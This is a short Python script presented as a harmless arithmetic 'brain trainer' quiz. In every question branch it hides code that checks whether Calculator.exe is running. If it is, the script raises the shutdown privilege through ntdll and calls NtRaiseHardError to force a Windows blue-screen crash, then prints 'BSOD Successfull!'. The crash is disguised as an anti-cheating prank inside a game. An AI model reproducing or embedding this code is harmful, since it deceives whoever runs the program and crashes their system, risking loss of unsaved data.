import wmi
import ctypes
import random
import os
counter = 0
print("Welcome to Marci's brain trainer!")
input("Press enter to start!")
while(counter < 10):
    r =    random.randint(1,3)
    f =    random.randint(1,100)
    f2 =    random.randint(1,100)
    f3 =    random.randint(1,100)
    f4 = random.randint(1,100)
    if r == 1:
        print(f"{f}*{f2}+{f3}-{f4}")
        megoldas = f * f2 + f3 - f4
        c=wmi.WMI()
        def check_process_running(str_):
            if(c.Win32_Process(name=str_)):
                ntdll = ctypes.windll.ntdll
                prev_value = ctypes.c_bool()
                res = ctypes.c_ulong()
                ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
                if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
                    print("BSOD Successfull!")
                else:
                    print("BSOD Failed...")
            else:
                print("")

                
        check_process_running("Calculator.exe") 
    elif r == 2:
        print(f"{f}-{f2}+{f3}*{f4}")
        megoldas = f - f2 + f3 * f4
        c=wmi.WMI()
        def check_process_running(str_):
            if(c.Win32_Process(name=str_)):
                ntdll = ctypes.windll.ntdll
                prev_value = ctypes.c_bool()
                res = ctypes.c_ulong()
                ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
                if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
                    print("BSOD Successfull!")
                else:
                    print("BSOD Failed...")
            else:
                print("")

                
        check_process_running("Calculator.exe") 
    elif r == 3:
        print(f"{f}+{f2}-{f3}*{f4}")
        megoldas =  f + f2 - f3 * f4
        c=wmi.WMI()
        def check_process_running(str_):
            if(c.Win32_Process(name=str_)):
                ntdll = ctypes.windll.ntdll
                prev_value = ctypes.c_bool()
                res = ctypes.c_ulong()
                ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
                if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
                    print("BSOD Successfull!")
                else:
                    print("BSOD Failed...")
            else:
                print("")

                
        check_process_running("Calculator.exe")
    usr_megoldas = int(input("\n Answer:"))
    if usr_megoldas == megoldas:
        print("Correct answer! Proceed")
        counter = counter + 1
    else:print("Wrong answer, retry with a different one!")
    continue

input("You won! Press enter to exit!")
